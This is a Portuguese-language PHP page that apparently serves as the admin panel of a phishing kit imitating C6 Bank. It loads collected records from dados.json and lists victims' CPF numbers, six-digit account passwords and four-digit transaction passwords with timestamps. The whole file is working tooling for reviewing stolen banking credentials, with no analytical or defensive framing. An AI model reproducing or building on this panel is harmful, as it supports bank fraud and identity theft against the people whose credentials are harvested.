<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel - Consulta de Dados</title>
    <style>
        @font-face {
            font-family: 'C6';
            src: url('../c6.ttf') format('truetype');
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #f5f5f5;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            padding: 30px;
        }

        h1 {
            color: #000;
            margin-bottom: 30px;
            font-size: 28px;
            font-weight: 600;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: #FFB800;
            color: #000;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
        }

        .stat-card h3 {
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 10px;
            opacity: 0.8;
        }

        .stat-card .value {
            font-size: 32px;
            font-weight: 700;
        }

        .table-container {
            overflow-x: auto;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }

        thead {
            background: #242424;
            color: #fff;
        }

        th {
            padding: 15px;
            text-align: left;
            font-weight: 600;
            font-size: 14px;
        }

        td {
            padding: 15px;
            border-bottom: 1px solid #e0e0e0;
            font-size: 14px;
        }

        tbody tr:hover {
            background: #f9f9f9;
        }

        .cpf {
            font-weight: 600;
            color: #000;
        }

        .senha {
            font-family: 'Courier New', monospace;
            background: #f0f0f0;
            padding: 4px 8px;
            border-radius: 4px;
            display: inline-block;
        }

        .data-hora {
            color: #666;
        }

        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #999;
        }

        .empty-state p {
            font-size: 16px;
            margin-top: 10px;
        }

        .refresh-btn {
            background: #FFB800;
            color: #000;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 20px;
            font-family: 'C6', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            transition: background 0.3s ease;
        }

        .refresh-btn:hover {
            background: #FFC933;
        }

        @media (max-width: 768px) {
            .container {
                padding: 15px;
            }

            table {
                font-size: 12px;
            }

            th, td {
                padding: 10px 8px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Painel de Consulta - Dados Coletados</h1>
        
        <button class="refresh-btn" onclick="location.reload()">🔄 Atualizar</button>

        <?php
        $arquivo = '../dados.json';
        $dados = [];

        if (file_exists($arquivo)) {
            $conteudo = file_get_contents($arquivo);
            $dados = json_decode($conteudo, true);
            if (!is_array($dados)) {
                $dados = [];
            }
        }

        $totalRegistros = count($dados);
        ?>

        <div class="stats">
            <div class="stat-card">
                <h3>Total de Registros</h3>
                <div class="value"><?php echo $totalRegistros; ?></div>
            </div>
        </div>

        <?php if ($totalRegistros > 0): ?>
        <div class="table-container">
            <table>
                <thead>
                    <tr>
                        <th>#</th>
                        <th>CPF</th>
                        <th>Senha (6 dígitos)</th>
                        <th>Senha Transacional (4 dígitos)</th>
                        <th>Data e Hora</th>
                    </tr>
                </thead>
                <tbody>
                    <?php 
                    $contador = 1;
                    foreach (array_reverse($dados) as $registro): 
                    ?>
                    <tr>
                        <td><?php echo $contador++; ?></td>
                        <td class="cpf"><?php echo htmlspecialchars($registro['cpf']); ?></td>
                        <td><span class="senha"><?php echo htmlspecialchars($registro['senha6']); ?></span></td>
                        <td><span class="senha"><?php echo htmlspecialchars($registro['senha4']); ?></span></td>
                        <td class="data-hora"><?php echo htmlspecialchars($registro['data_hora']); ?></td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
        <?php else: ?>
        <div class="empty-state">
            <p>Nenhum registro encontrado.</p>
        </div>
        <?php endif; ?>
    </div>
</body>
</html>

